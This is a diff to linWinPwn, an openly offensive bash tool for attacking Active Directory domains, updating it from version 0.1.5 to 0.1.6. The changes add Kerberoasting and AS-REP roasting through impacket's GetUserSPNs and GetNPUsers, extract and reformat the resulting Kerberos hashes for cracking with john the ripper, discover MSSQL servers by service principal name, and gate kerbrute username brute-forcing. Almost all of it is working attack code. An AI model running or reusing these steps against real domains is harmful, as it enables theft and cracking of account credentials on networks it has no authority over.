@@ -6,7 +6,7 @@
 #     | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | |
 #     |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
 #
-# linWinPwn - version 0.1.5 (https://github.com/lefayjey/linWinPwn)
+# linWinPwn - version 0.1.6 (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
 #
@@ -53,7 +53,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.1.5
+      ${BLUE}linWinPwn: ${CYAN} version 0.1.6
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey
 ${NC}
@@ -247,9 +247,11 @@ dns_enum () {
             mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 >> ${dc_ip_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
             /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 >> ${dc_hostname_list}
-            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 2 >> ${sql_hostname_list}
+            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 >> ${sql_hostname_list}
+            for i in $(/bin/cat ${sql_hostname_list}); do
+                grep ${i} ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
+            done
         fi
     else
         echo -e "${YELLOW}[i] DNS dump found ${NC}"
@@ -521,7 +523,7 @@ kerberos () {
     if [ ! -f "${kerbrute}" ] ; then
         echo -e "${RED}[-] Please verify the installation of kerbrute${NC}"
     else
-        if [ ! -s "${known_users_list}" ] ; then
+        if [ ! -s "${known_users_list}" ] && [  "${nullsess_bool}" == true ] ; then
             echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
             ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -threads 5 -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
             if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
@@ -547,7 +549,7 @@ kerberos () {
     /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
 
     echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
-    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ; then
+    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] || [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     elif [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
         if [ -s "${known_users_list}" ] ; then
@@ -555,17 +557,33 @@ kerberos () {
         fi
         ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
         /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
+    else
+        ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -dc-ip ${dc_ip}
+        ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+        echo -e "${BLUE}[*] Kerberoast Attack${NC}"
+        ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
+        ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+        if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
+                echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
+            else
+                /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
+        fi
+        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
+            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
+        else
+            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
+        fi
     fi 
 
-    if [ ! -f "${crackmapexec}" ] ; then
-        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
-    else
-        if [ "${nullsess_bool}" == false ] ; then
-            ${crackmapexec} ldap ${target} ${argument_cme} --asreproast ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
-            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            ${crackmapexec} ldap ${target} ${argument_cme} --kerberoast ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
-        fi
-    fi
+    #if [ ! -f "${crackmapexec}" ] ; then
+    #    echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
+    #else
+    #    if [ "${nullsess_bool}" == false ] ; then
+    #        ${crackmapexec} ldap ${target} ${argument_cme} --asreproast ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+    #        echo -e "${BLUE}[*] Kerberoast Attack${NC}"
+    #        ${crackmapexec} ldap ${target} ${argument_cme} --kerberoast ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --kdcHost "${kdc}${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+    #    fi
+    #fi
     
     echo -e "${BLUE}[*] Cracking hashes using john the ripper${NC}"
     if [ ! -f "${john}" ] ; then
